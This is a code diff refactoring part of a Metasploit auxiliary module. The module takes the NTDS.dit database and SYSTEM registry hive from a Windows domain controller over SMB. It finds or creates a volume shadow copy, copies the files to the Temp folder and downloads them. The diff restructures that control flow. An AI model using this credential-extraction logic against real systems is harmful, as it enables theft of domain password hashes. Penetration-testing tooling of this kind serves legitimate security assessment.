@@ -73,35 +73,22 @@ class Metasploit3 < Msf::Auxiliary
 
 			if datastore['VSCPATH'].length > 0
 				print_status("#{peer} - Attempting to grab NTDS.dit from #{datastore['VSCPATH']}")
-				n = copy_ntds(ip, datastore['VSCPATH'])
-				s = copy_sys_hive(smbshare, ip)
+				vscpath = datastore['VSCPATH']
+			else
+				vscpath = check_vss(ip, text, bat)
+				unless vscpath
+					vscpath = make_volume_shadow_copy(ip, createvsc, text, bat)
+				end
+			end
+			if vscpath
+				n = copy_ntds(ip, vscpath)
+				s = copy_sys_hive(ip)
 				if n && s
 					download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
 					download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
 				end
 			else
-				if vscpath = check_vss(ip, text, bat)
-					#Check if VSC Already exists
-					n = copy_ntds(ip, vscpath)
-					s = copy_sys_hive(smbshare, ip)
-					if n && s
-						# If the above succeeds then we just have to download our files
-						download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
-						download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
-					end
-				else
-					# If VSC doesn't exists already then we see if we can create a new VSC
-					if vscpath = make_volume_shadow_copy(ip, createvsc, text, bat)
-						# If we are successul, try and copy NTDS.dit and SYSTEM hive files
-						n = copy_ntds(ip, vscpath)
-						s = copy_sys_hive(smbshare, ip)
-						if n && s
-							# If the above succeeds then we just have to download our files
-							download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
-							download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
-						end
-					end
-				end
+				print_error("#{peer} - Failed to find volume shadow copy")
 			end
 			cleanup_after(smbshare, ip)
 			disconnect
@@ -187,7 +174,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Create a copy of the SYSTEM hive file and stores it in the Windows
 	# Temp directory on the target host
-	def copy_sys_hive(smbshare, ip)
+	def copy_sys_hive(ip)
 		print_status("Copying SYSTEM hive file to Windows Temp directory")
 		begin
 			# Try to crate the sys hive copy
